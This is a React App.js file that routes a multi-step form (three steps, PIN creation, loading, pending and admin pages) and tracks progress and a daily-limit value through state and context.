import { useState, createContext } from "react";
import { Routes, Route, Navigate } from "react-router-dom";
import Header from "./components/Header";
import Footer from "./components/Footer";
import Stepi from "./pages/Stepi";
import Stepii from "./pages/Stepii";
import Stepiii from "./pages/Stepiii";
import PinCreationPage from "./pages/PinCreationPage";
import LoadingPage from "./pages/LoadingPage";
import PendingPage from "./pages/PendingPage";
import AdminPage from "./pages/AdminPage";

export const FormContext = createContext();

function App() {
  const [progress, setProgress] = useState(0);
  const [dailyLimit, setDailyLimit] = useState(0);
  const [formData, setFormData] = useState({});

  return (
    <FormContext.Provider value={{ formData, setFormData }}>
      <div
        style={{
          minHeight: "100vh",
          backgroundColor: "#e6f0fa",
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between",
          "@media (max-width: 480px)": { padding: "10px" },
        }}
      >
        <Header />
        <main
          style={{
            flex: "1",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            padding: "20px",
          }}
        >
          <div
            style={{
              width: "100%",
              maxWidth: "400px",
              backgroundColor: "white",
              padding: "24px",
              borderRadius: "8px",
              boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
            }}
          >
            <div
              style={{
                textAlign: "center",
                fontSize: "16px",
                fontWeight: "bold",
                marginBottom: "20px",
                color: "#333",
              }}
            >
              Progress: {progress}% Complete
            </div>
            <Routes>
              <Route path="/" element={<Navigate to="/stepi" />} />
              <Route
                path="/stepi"
                element={<Stepi nextStep={() => setProgress(33)} />}
              />
              <Route
                path="/stepii"
                element={
                  <Stepii
                    nextStep={() => setProgress(66)}
                    prevStep={() => setProgress(33)}
                  />
                }
              />
              <Route
                path="/stepiii"
                element={
                  <Stepiii
                    prevStep={() => setProgress(66)}
                    setDailyLimit={setDailyLimit}
                  />
                }
              />
              <Route
                path="/pin-creation"
                element={<PinCreationPage prevStep={() => setProgress(80)} />}
              />
              <Route path="/loading" element={<LoadingPage />} />
              <Route
                path="/pending"
                element={<PendingPage amount={dailyLimit * 3} />}
              />
              <Route path="/admin" element={<AdminPage />} />
            </Routes>
          </div>
        </main>
        <Footer />
      </div>
    </FormContext.Provider>
  );
}

export default App;
